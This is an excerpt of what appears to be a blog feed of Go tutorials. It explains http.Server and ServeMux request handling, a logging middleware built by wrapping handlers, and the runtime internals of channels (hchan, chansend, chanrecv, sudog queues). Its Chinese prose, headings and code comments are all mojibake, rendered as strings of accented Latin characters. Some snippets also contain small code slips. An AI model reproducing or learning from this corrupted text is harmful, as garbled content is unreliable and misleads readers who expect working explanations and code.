<p>Server ä¼šç›‘å¬å…¶ <code>Addr</code> å±æ€§ä¸Šçš„ TCP è¿æ¥ï¼Œä¸ºæ¯ä¸ªåˆ°æ¥çš„ TCP è¿æ¥åˆ›å»ºä¸€ä¸ª <code>http.conn</code> ä½œä¸ºå…¶åœ¨æœåŠ¡å™¨ç«¯çš„æŠ½è±¡ã€‚ä» <code>http.conn</code> ä¸­è¯»å–å¹¶è§£æ HTTP è¯·æ±‚ï¼Œåˆ›å»º <code>http.ResponseWriter</code> ä½œä¸ºè¯¥è¯·æ±‚çš„å“åº”çš„æŠ½è±¡ï¼Œç„¶ååœ¨ Server çš„ <code>Handler</code> å­—æ®µä¸­å¯»æ‰¾æ˜¯å¦æŒ‡å®šäº† ServerMuxï¼ˆå­—æ®µä¸ºç©ºåˆ™ä½¿ç”¨ DefaultServeMuxï¼‰ã€‚æœ€ååœ¨ ServeMux ä¸­æŸ¥æ‰¾å¹¶è°ƒç”¨ç›¸åº”çš„å¤„ç†å™¨æ„å»º HTTP å“åº”ã€‚</p>
<p>Serer å½“ç„¶ä¹Ÿæ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mux := NewServeMux()</span><br><span class="line">    mux.HandleFunc(<span class="string">&quot;/hello&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">&quot;hello world!&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    server := &amp;http.Server&#123; <span class="comment">// è‡ªå®šä¹‰ Server çš„å„ç§å±æ€§</span></span><br><span class="line">        Handler: mux,</span><br><span class="line">        Addr: <span class="string">&quot;:8086&quot;</span>,</span><br><span class="line">        ReadTimeout: <span class="number">1</span> * time.Second,</span><br><span class="line">        WriteTimeout: <span class="number">2</span> * time.Second,</span><br><span class="line">    &#125;</span><br><span class="line">    server.ListenAndServe()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ææä¸­é—´ä»¶"><a href="#ææä¸­é—´ä»¶" class="headerlink" title="ææä¸­é—´ä»¶"></a>ææä¸­é—´ä»¶</h2><p>æ—¢ç„¶ handler å¤„ç†å™¨è´Ÿè´£å¯¹è¯·æ±‚æ„å»ºå“åº”ï¼Œè€Œå‡½æ•°åœ¨ go ä¸­åˆæ˜¯æ‰€è°“â€œä¸€ç­‰å…¬æ°‘â€ï¼ˆå¯ä»¥è¢«èµ‹å€¼ä¸è¿”å›ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¯¹å®ƒåšç‚¹æ–‡ç« ã€‚æ¯”å¦‚åœ¨ä¸€ä¸ªå¤„ç†å™¨ä¹‹å¤–å†åŒ…ä¸€å±‚é€»è¾‘å½¢æˆä¸€ä¸ªæœ‰é¢å¤–è¡Œä¸ºçš„æ–°å¤„ç†å™¨ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåªè¦æˆ‘ä»¬å®ç°äº†ç­¾åä¸º <code>func(Handler) Handler</code> çš„å‡½æ•°ï¼Œå°±å¯ä»¥é¢å¤–å®ç°ä¸€å±‚é€»è¾‘ï¼Œæ¯”å¦‚æ‰“å°å“åº”åˆ°æ¥çš„æ—¶é—´ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    hello := <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">&quot;hello world!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    timeLog := <span class="function"><span class="keyword">func</span><span class="params">(next http.Handler)</span> <span class="title">http</span>.<span class="title">Handler</span></span> &#123;</span><br><span class="line">        <span class="comment">// æ„å»ºä¸€ä¸ªæ–°çš„å¤„ç†å™¨ï¼Œé‡Œé¢åŒ…å«åŸå¤„ç†å™¨</span></span><br><span class="line">        <span class="keyword">return</span> http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(writer http.ResponseWriter, request *http.Request)</span></span> &#123;</span><br><span class="line">            log.Printf( <span class="string">&quot;handling the request at: %v&quot;</span>,  time.Now())</span><br><span class="line">            next.ServeHTTP(writer, request)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    http.Handle(<span class="string">&quot;/hello&quot;</span>, timeLog(http.HandlerFunc(hello)))</span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Goåº•å±‚å¤§å†’é™©ä¹‹channel</title>
    <url>/2020/06/01/channel-Go%E7%9A%84%E4%BC%A0%E5%A3%B0%E7%AD%92/</url>
    <content><![CDATA[<p>å¾—ç›Šäº goroutine çš„è®¾è®¡ï¼ŒGo åœ¨æ‰§è¡Œå¹¶å‘ä»»åŠ¡æ˜¯å¯è°“æ˜¯å¾—å¿ƒåº”æ‰‹ã€‚æ—¢ç„¶å­˜åœ¨å¹¶å‘ï¼Œå°±å¿…ç„¶ç‰µæ‰¯åˆ°å¤šä»»åŠ¡åŒæ­¥çš„é—®é¢˜ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨å…±äº«å†…å­˜æ¥é€šä¿¡ï¼ˆå¦‚å…±äº«å˜é‡ï¼‰ï¼Œä½†æ˜¯ Go çš„è®¾è®¡å“²å­¦ä¸­æœ‰ä¸€å¥è¯å«åš<code>ä¸è¦ç”¨å…±äº«å†…å­˜æ¥é€šä¿¡ï¼Œè€Œæ˜¯ç”¨é€šä¿¡å…±äº«å†…å­˜</code>ã€‚åˆ©ç”¨å†…ç½®çš„ channel ç»“æ„ä½“åœ¨å¤šä¸ª goroutine é—´é€šä¿¡æ˜¯æ›´å®‰å…¨ä¹Ÿæ˜¯æ›´è¢«æ¨å´‡çš„ã€‚</p>
<span id="more"></span>

<p>channel åœ¨ runtime ä¸­ç”¨ <code>hchan</code>  ç»“æ„ä½“è¡¨ç¤ºï¼Œæ¯æ¬¡åˆ›å»º channel éƒ½æ˜¯åˆ›å»ºäº†ä¸€ä¸ªè¿™æ ·çš„ç»“æ„ä½“:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> hchan <span class="keyword">struct</span> &#123;</span><br><span class="line">    qcount   <span class="keyword">uint</span> <span class="comment">// channel ä¸­å…ƒç´ ä¸ªæ•°</span></span><br><span class="line">    dataqsiz <span class="keyword">uint</span> <span class="comment">// channel ä¸­å¾ªç¯é˜Ÿåˆ—é•¿åº¦</span></span><br><span class="line">    buf      unsafe.Pointer <span class="comment">// channel çš„ç¼“å†²åŒºæ•°æ®æŒ‡é’ˆ</span></span><br><span class="line">    elemsize <span class="keyword">uint16</span> <span class="comment">// channel èƒ½æ”¶å‘çš„å…ƒç´ å¤§å°</span></span><br><span class="line">    closed   <span class="keyword">uint32</span></span><br><span class="line">    elemtype *_type <span class="comment">// channel èƒ½å¤Ÿæ”¶å‘çš„å…ƒç´ ç±»å‹</span></span><br><span class="line">    sendx    <span class="keyword">uint</span> <span class="comment">// ç¼“å†²è¿‡åŒºä¸­ channel çš„å‘é€æ“ä½œå¤„ç†åˆ°çš„ä½ç½®</span></span><br><span class="line">    recvx    <span class="keyword">uint</span> <span class="comment">// ç¼“å†²åŒºä¸­ channel çš„æ¥æ”¶æ“ä½œå¤„ç†åˆ°çš„ä½ç½®</span></span><br><span class="line">    recvq    waitq <span class="comment">// é˜»å¡åœ¨è¿™ä¸ª hchan ä¸Šçš„æ¥æ”¶ goroutine é˜Ÿåˆ—</span></span><br><span class="line">    sendq    waitq <span class="comment">// é˜»å¡åœ¨è¿™ä¸ª hchan ä¸Šçš„å‘é€ goroutine é˜Ÿåˆ—</span></span><br><span class="line"></span><br><span class="line">    lock mutex <span class="comment">// è§£å†³å¯èƒ½çš„çº¿ç¨‹ç«äº‰é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯è¯´ channel æ˜¯çº¿ç¨‹å®‰å…¨çš„</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> waitq <span class="keyword">struct</span> &#123;</span><br><span class="line">    first *sudog</span><br><span class="line">    last  *sudog</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> sudog <span class="keyword">struct</span> &#123;</span><br><span class="line">    g *g</span><br><span class="line">    next     *sudog <span class="comment">// ä¸‹ä¸€ä¸ª sudog</span></span><br><span class="line">    prev     *sudog <span class="comment">// ä¸Šä¸€ä¸ª sudong</span></span><br><span class="line">    elem     unsafe.Pointer <span class="comment">// æŒ‡å‘æ•°æ®</span></span><br><span class="line">    c        *hchan <span class="comment">// å±äºå“ªä¸ª channel</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å‘-Channel-å‘é€"><a href="#å‘-Channel-å‘é€" class="headerlink" title="å‘ Channel å‘é€"></a>å‘ Channel å‘é€</h2><p>å‡½æ•° <code>runtime.chansend</code> è´Ÿè´£å‘ channel å‘é€æ•°æ®çš„å…¨éƒ¨é€»è¾‘ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    lock(&amp;c.lock)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> c.closed != <span class="number">0</span> &#123;</span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="built_in">panic</span>(plainError(<span class="string">&quot;send on closed channel&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>åœ¨å‘é€æ•°æ®çš„é€»è¾‘æ‰§è¡Œä¹‹å‰ä¼šå…ˆä¸ºå½“å‰ Channel åŠ é”ï¼Œé˜²æ­¢å‘ç”Ÿç«äº‰æ¡ä»¶ã€‚å¦‚æœ Channel å·²ç»å…³é—­ï¼Œé‚£ä¹ˆå‘è¯¥ Channel å‘é€æ•°æ®æ—¶å°±ä¼šæŠ¥â€send on closed channelâ€ é”™è¯¯å¹¶ä¸­æ­¢ç¨‹åºã€‚æ•´ä¸ªå‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹å¯åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š</p>
<ol>
<li>å­˜åœ¨ç­‰å¾…çš„æ¥æ”¶è€…æ—¶ï¼ŒæŠŠæ•°æ®ç›´æ¥å‘é€ç»™é˜»å¡çš„æ¥æ”¶è€…</li>
<li>å­˜åœ¨å¯ç”¨ç¼“å†²åŒºæ—¶ï¼ŒæŠŠæ•°æ®å†™å…¥ç¼“å†²åŒº</li>
<li>ä¸å­˜åœ¨ç¼“å†²åŒºæˆ–ç¼“å†²åŒºå·²æ»¡æ—¶ï¼Œç­‰å¾…å…¶å®ƒ goroutine ä»è¯¥ channel æ¥æ”¶æ•°æ®</li>
</ol>
<h3 id="ç›´æ¥å‘é€"><a href="#ç›´æ¥å‘é€" class="headerlink" title="ç›´æ¥å‘é€"></a>ç›´æ¥å‘é€</h3><p>å¦‚æœç›®æ ‡ Channel æ²¡æœ‰è¢«å…³é—­å¹¶ä¸”å·²ç»æœ‰å¤„äºè¯»ç­‰å¾…çš„ Goroutineï¼Œé‚£ä¹ˆ runtime.chansend å‡½æ•°ä¼šä»æ¥æ”¶é˜Ÿåˆ— recvq ä¸­å–å‡ºæœ€å…ˆé™·å…¥ç­‰å¾…çš„ Goroutine å¹¶ç›´æ¥å‘å®ƒå‘é€æ•°æ®:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> sg := c.recvq.dequeue(); sg != <span class="literal">nil</span> &#123;</span><br><span class="line">        send(c, sg, ep, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; unlock(&amp;c.lock) &#125;, <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘é€æ•°æ®æ—¶è°ƒç”¨ <code>runtime.send</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°çš„æ‰§è¡Œå¯ä»¥åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼š</p>
<ol>
<li>å°†å‘é€çš„æ•°æ®ç›´æ¥æ‹·è´åˆ° x = &lt;-c è¡¨è¾¾å¼ä¸­å˜é‡ x æ‰€åœ¨çš„å†…å­˜åœ°å€ä¸Š</li>
<li>å°†ç­‰å¾…æ¥æ”¶æ•°æ®çš„ Goroutine æ ‡è®°æˆå¯è¿è¡ŒçŠ¶æ€ Grunnable å¹¶æŠŠè¯¥ Goroutine æ”¾åˆ°å‘é€æ–¹æ‰€åœ¨çš„å¤„ç†å™¨çš„ runnext ä¸Šç­‰å¾…æ‰§è¡Œ</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">(c *hchan, sg *sudog, ep unsafe.Pointer, unlockf <span class="keyword">func</span>()</span>, <span class="title">skip</span> <span class="title">int</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> sg.elem != <span class="literal">nil</span> &#123;</span><br><span class="line">        sendDirect(c.elemtype, sg, ep) <span class="comment">// ç›´æ¥æŠŠæ•°æ®æ‹·è´åˆ°æ¥æ”¶ goroutine å¯¹åº”å˜é‡çš„å†…å­˜åœ°å€</span></span><br><span class="line">        sg.elem = <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    gp := sg.g</span><br><span class="line">    unlock()</span><br><span class="line">    gp.param = unsafe.Pointer(sg)</span><br><span class="line">    goready(gp, skip+<span class="number">1</span>) <span class="comment">// æ”¹å˜æ¥æ”¶ goroutine çš„çŠ¶æ€ï¼Œæ”¾å…¥å¤„ç†å™¨ runnext å±æ€§</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‘é€åˆ°ç¼“å†²åŒº"><a href="#å‘é€åˆ°ç¼“å†²åŒº" class="headerlink" title="å‘é€åˆ°ç¼“å†²åŒº"></a>å‘é€åˆ°ç¼“å†²åŒº</h3><p>å¦‚æœåˆ›å»ºçš„ Channel åŒ…å«ç¼“å†²åŒºå¹¶ä¸” channel ä¸­çš„æ•°æ®æ²¡æœ‰è£…æ»¡ï¼Œchansend å°±ä¼šæ‰§è¡Œä¸‹é¢è¿™æ®µä»£ç ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> c.qcount &lt; c.dataqsiz &#123;</span><br><span class="line">        qp := chanbuf(c, c.sendx) <span class="comment">// è®¡ç®—å‡ºç¼“å†²åŒºä¸‹ä¸€ä¸ªå¯ç”¨ä½ç½®</span></span><br><span class="line">        typedmemmove(c.elemtype, qp, ep) <span class="comment">// å‘é€æ•°æ®åˆ°ç¼“å†²åŒº</span></span><br><span class="line">        c.sendx++ <span class="comment">// æ›´æ–°ç¼“å†²åŒºæŒ‡é’ˆ</span></span><br><span class="line">        <span class="keyword">if</span> c.sendx == c.dataqsiz &#123;</span><br><span class="line">            c.sendx = <span class="number">0</span> <span class="comment">// ç¼“å†²åŒºæ˜¯ä¸€ä¸ªå¾ªç¯é˜Ÿåˆ—ï¼Œå¦‚æœæ»¡äº†å°±æŒ‡å‘é˜Ÿå¤´</span></span><br><span class="line">        &#125;</span><br><span class="line">        c.qcount++ <span class="comment">// æ›´æ–°ç¼“å†²åŒºè®¡æ•°</span></span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="é˜»å¡å‘é€"><a href="#é˜»å¡å‘é€" class="headerlink" title="é˜»å¡å‘é€"></a>é˜»å¡å‘é€</h3><p>å¦‚æœ channel ä¸Šæ²¡æœ‰ç­‰å¾…æ¥æ”¶çš„ goroutine æˆ–ç¼“å†²åŒºä¸å¯ç”¨ï¼Œå½“å‰å‘é€æ•°æ®çš„ goroutine ä¼šè¢«é˜»å¡å¹¶åŠ å…¥ channel çš„å‘é€é˜Ÿåˆ—ã€‚chansend ä¼šæ‰§è¡Œä¸‹é¢çš„ä»£ç :</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> !block &#123;</span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    gp := getg() <span class="comment">// è·å¾—å½“å‰å°è¯•å‘ channel å‘é€æ•°æ®çš„ Goroutine</span></span><br><span class="line">    mysg := acquireSudog() <span class="comment">// è·å–ä¸€ä¸ª sudog ç»“æ„ä½“å¹¶è®¾ç½®ç›¸å…³çš„å±æ€§</span></span><br><span class="line">    mysg.elem = ep</span><br><span class="line">    mysg.g = gp</span><br><span class="line">    mysg.c = c</span><br><span class="line">    gp.waiting = mysg <span class="comment">// è¡¨ç¤ºå½“å‰ Goroutine ç­‰å¾…åœ¨ sudog ä¸Š</span></span><br><span class="line">    c.sendq.enqueue(mysg) <span class="comment">// å°†å‡†å¤‡å¥½çš„ sudog åŠ å…¥ channel çš„å‘é€é˜Ÿåˆ—</span></span><br><span class="line">    goparkunlock(&amp;c.lock, waitReasonChanSend, traceEvGoBlockSend, <span class="number">3</span>) <span class="comment">// å°†å½“å‰ Goroutine é™·å…¥æ²‰ç¡å¹¶ç­‰å¾…å”¤é†’</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åšä¸€äº›æ¸…ç©ºå±æ€§çš„æ”¶å°¾å·¥ä½œ</span></span><br><span class="line">    gp.waiting = <span class="literal">nil</span></span><br><span class="line">    gp.param = <span class="literal">nil</span></span><br><span class="line">    mysg.c = <span class="literal">nil</span></span><br><span class="line">    releaseSudog(mysg)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>ä½¿ç”¨ <code>ch &lt;- i</code> å‘ä¸€ä¸ª channel å‘é€æ•°æ®æ—¶ï¼š</p>
<ol>
<li>å¦‚æœå½“å‰ Channel çš„ recvq ä¸Šå­˜åœ¨å·²ç»è¢«é˜»å¡çš„ Goroutineï¼Œé‚£ä¹ˆä¼šç›´æ¥å°†æ•°æ®å‘é€ç»™å½“å‰çš„ Goroutine å¹¶å°†å…¶è®¾ç½®æˆä¸‹ä¸€ä¸ªè¿è¡Œçš„ Goroutineï¼›</li>
<li>å¦‚æœ Channel å­˜åœ¨ç¼“å†²åŒºå¹¶ä¸”å…¶ä¸­è¿˜æœ‰ç©ºé—²çš„å®¹é‡ï¼Œæˆ‘ä»¬å°±ä¼šç›´æ¥å°†æ•°æ®ç›´æ¥å­˜å‚¨åˆ°å½“å‰ç¼“å†²åŒº sendx æ‰€åœ¨çš„ä½ç½®ä¸Šï¼›</li>
<li>å¦‚æœä¸æ»¡è¶³ä¸Šé¢çš„ä¸¤ç§æƒ…å†µï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ª runtime.sudog ç»“æ„å¹¶å°†å…¶åŠ å…¥ Channel çš„ sendq é˜Ÿåˆ—ä¸­ï¼Œå½“å‰ Goroutine ä¹Ÿä¼šé™·å…¥é˜»å¡ç­‰å¾…å…¶ä»–çš„åç¨‹ä» Channel æ¥æ”¶æ•°æ®</li>
</ol>
<p>å‘é€è¿‡ç¨‹ä¸­ï¼Œ2 ä¸ªæ—¶æœºä¼šè§¦å‘ Goroutine è°ƒåº¦ï¼š</p>
<ol>
<li>å‘é€æ•°æ®æ—¶å‘ç° channel ä¸Šå­˜åœ¨ç­‰å¾…æ¥æ”¶æ•°æ®çš„ Goroutineï¼Œç«‹åˆ»è®¾ç½®å¤„ç†å™¨çš„ runnext å±æ€§ï¼Œä½†æ˜¯å¹¶ä¸ä¼šç«‹åˆ»è§¦å‘è°ƒåº¦</li>
<li>å‘é€æ•°æ®æ—¶å¹¶æ²¡æœ‰æ‰¾åˆ°æ¥æ”¶æ–¹å¹¶ä¸”ç¼“å†²åŒºå·²ç»æ»¡äº†ï¼Œè¿™æ—¶å°±ä¼šå°†è‡ªå·±åŠ å…¥ Channel çš„ sendq é˜Ÿåˆ—å¹¶è°ƒç”¨ runtime.goparkunlock è§¦å‘ Goroutine çš„è°ƒåº¦è®©å‡ºå¤„ç†å™¨çš„ä½¿ç”¨æƒ</li>
</ol>
<h2 id="ä»-Channel-æ¥æ”¶"><a href="#ä»-Channel-æ¥æ”¶" class="headerlink" title="ä» Channel æ¥æ”¶"></a>ä» Channel æ¥æ”¶</h2><p>ä½¿ç”¨ <code>i &lt;- ch</code> æˆ– <code>i, ok &lt;- ch</code> éƒ½å¯ä»¥ä» channel æ¥æ”¶æ•°æ®ï¼Œä¸åŒæ–¹æ³•åœ¨ runtime æœ€åéƒ½æ˜¯è°ƒç”¨ <code>runtime.chanrecv</code> æ–¹æ³•ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chanrecv</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>)</span> <span class="params">(selected, received <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> c == <span class="literal">nil</span> &#123; <span class="comment">// channel ä¸ºç©ºï¼ˆæœªåˆ›å»ºå¯¹è±¡ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> !block &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æŒ‚èµ·å½“å‰ goroutien</span></span><br><span class="line">        gopark(<span class="literal">nil</span>, <span class="literal">nil</span>, waitReasonChanReceiveNilChan, traceEvGoStop, <span class="number">2</span>)</span><br><span class="line">        throw(<span class="string">&quot;unreachable&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    lock(&amp;c.lock)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> c.closed != <span class="number">0</span> &amp;&amp; c.qcount == <span class="number">0</span> &#123; <span class="comment">// å¦‚æœ channel å·²ç»å…³é—­å¹¶ä¸”ç¼“å†²åŒºæ²¡æœ‰æ•°æ®ï¼Œç›´æ¥è¿”å›</span></span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="keyword">if</span> ep != <span class="literal">nil</span> &#123;</span><br><span class="line">            typedmemclr(c.elemtype, ep)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="éé˜»å¡æ¥æ”¶"><a href="#éé˜»å¡æ¥æ”¶" class="headerlink" title="éé˜»å¡æ¥æ”¶"></a>éé˜»å¡æ¥æ”¶</h3><p>å½“ Channel çš„ sendq é˜Ÿåˆ—ä¸­åŒ…å«å¤„äºç­‰å¾…çŠ¶æ€çš„ Goroutine æ—¶ï¼Œè¯¥å‡½æ•°ä¼šå–å‡ºé˜Ÿåˆ—å¤´ç­‰å¾…çš„ Goroutineï¼Œå¤„ç†çš„é€»è¾‘å’Œå‘é€æ—¶ç›¸å·®æ— å‡ ã€‚</p>
<ul>
<li>å¦‚æœ channel ä¸å­˜åœ¨ç¼“å†²åŒºï¼šå°† channel å‘é€é˜Ÿåˆ— sendq ä¸­ Goroutine å­˜å‚¨çš„ elem æ•°æ®æ‹·è´åˆ°ç›®æ ‡å†…å­˜åœ°å€ä¸­ï¼›</li>
<li>å¦‚æœ channel å­˜åœ¨ç¼“å†²åŒºï¼š<ol>
<li>å°† recvx æŒ‡å‘çš„ç¼“å†²åŒºçš„æ•°æ®æ‹·è´åˆ°æ¥æ”¶æ–¹çš„å†…å­˜åœ°å€</li>
<li>å°†å‘é€é˜Ÿåˆ— sendq å¤´çš„ sudog ä¸­æ•°æ®æ‹·è´åˆ°ç¼“å†²åŒºï¼Œé‡Šæ”¾ä¸€ä¸ªé˜»å¡çš„å‘é€æ–¹<br><img src="https://i.loli.net/2020/05/25/13WoPzZrpjmYEnh.png" alt="å­˜åœ¨ç¼“å†²åŒº"></li>
</ol>
</li>
</ul>
<p>æ— è®ºå‘ç”Ÿå“ªç§æƒ…å†µï¼Œè¿è¡Œæ—¶éƒ½ä¼šè°ƒç”¨ runtime.goready å‡½æ•°å°†å½“å‰å¤„ç†å™¨çš„ runnext è®¾ç½®æˆå‘é€æ•°æ®çš„ Goroutineï¼Œåœ¨è°ƒåº¦å™¨ä¸‹ä¸€æ¬¡è°ƒåº¦æ—¶å°†é˜»å¡çš„å‘é€æ–¹å”¤é†’ã€‚</p>
<h3 id="é˜»å¡æ¥æ”¶"><a href="#é˜»å¡æ¥æ”¶" class="headerlink" title="é˜»å¡æ¥æ”¶"></a>é˜»å¡æ¥æ”¶</h3><p>å½“ channel çš„å‘é€é˜Ÿåˆ—ä¸­ä¸å­˜åœ¨ç­‰å¾…çš„ Goroutine å¹¶ä¸”ç¼“å†²åŒºä¸­ä¹Ÿä¸å­˜åœ¨ä»»ä½•æ•°æ®æ—¶ï¼Œä»ç®¡é“ä¸­æ¥æ”¶æ•°æ®çš„æ“ä½œä¼šå˜æˆé˜»å¡æ“ä½œã€‚å½“å‰è¯·æ±‚æ¥æ”¶çš„ Goroutine ä¼šè¢«åŒ…è£…æˆä¸€ä¸ª sudog æ”¾å…¥è¯¥ channel çš„æ¥æ”¶ç­‰å¾…é˜Ÿåˆ— recvqï¼Œç„¶åè§¦å‘è°ƒåº¦ã€‚</p>
<h3 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>ä» channel ä¸­æ¥æ”¶æ•°æ®ï¼Œå¯èƒ½æœ‰ä»¥ä¸‹ 5 ä¸­æƒ…å†µï¼š</p>
<ol>
<li>å¦‚æœ Channel ä¸ºç©ºï¼Œé‚£ä¹ˆå°±ä¼šç›´æ¥è°ƒç”¨ runtime.gopark æŒ‚èµ·å½“å‰ Goroutineï¼›</li>
<li>å¦‚æœ Channel å·²ç»å…³é—­å¹¶ä¸”ç¼“å†²åŒºæ²¡æœ‰ä»»ä½•æ•°æ®ï¼Œruntime.chanrecv å‡½æ•°ä¼šç›´æ¥è¿”å›ï¼›</li>
<li>å¦‚æœ Channel çš„ sendq é˜Ÿåˆ—ä¸­å­˜åœ¨æŒ‚èµ·çš„ Goroutineï¼Œå°±ä¼šå°† recvx ç´¢å¼•æ‰€åœ¨çš„æ•°æ®æ‹·è´åˆ°æ¥æ”¶å˜é‡æ‰€åœ¨çš„å†…å­˜ç©ºé—´ä¸Šå¹¶å°† sendq é˜Ÿåˆ—ä¸­ Goroutine çš„æ•°æ®æ‹·è´åˆ°ç¼“å†²åŒºï¼›</li>
<li>å¦‚æœ Channel çš„ç¼“å†²åŒºä¸­åŒ…å«æ•°æ®å°±ä¼šç›´æ¥è¯»å– recvx ç´¢å¼•å¯¹åº”çš„æ•°æ®ï¼›</li>
<li>åœ¨é»˜è®¤æƒ…å†µä¸‹ä¼šæŒ‚èµ·å½“å‰çš„ Goroutineï¼Œå°† runtime.sudog ç»“æ„åŠ å…¥ recvq é˜Ÿåˆ—å¹¶é™·å…¥ä¼‘çœ ç­‰å¾…è°ƒåº¦å™¨çš„å”¤é†’ï¼›</li>
</ol>
<p>æ¥æ”¶è¿‡ç¨‹ä¸­ï¼Œ2 ä¸ªè¿‡ç¨‹ä¼šè§¦å‘ goroutine è°ƒåº¦ï¼š</p>
<ol>
<li>channel ä¸ºç©º</li>
<li>ç¼“å†²åŒºä¸­ä¸å­˜åœ¨æ•°æ®å¹¶ä¸”ä¹Ÿä¸å­˜åœ¨æ•°æ®çš„å‘é€è€…</li>
</ol>
